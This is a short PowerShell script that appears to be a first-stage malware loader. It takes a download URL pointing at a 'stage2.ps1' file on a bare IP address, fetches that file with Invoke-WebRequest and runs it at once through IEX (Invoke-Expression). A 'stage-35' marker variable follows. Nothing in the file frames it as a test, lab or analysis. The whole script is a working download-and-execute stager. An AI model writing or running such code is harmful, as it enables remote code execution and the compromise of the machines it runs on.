
[CmdletBinding()]
param(
    [string]$DownloadUrl = 'http://198.51.100.61/stage2.ps1',
    [int]$ConnectionTimeout = 107
)
IEX (Invoke-WebRequest -Uri $DownloadUrl -UseBasicParsing).Content
$StageMarker = "stage-35"
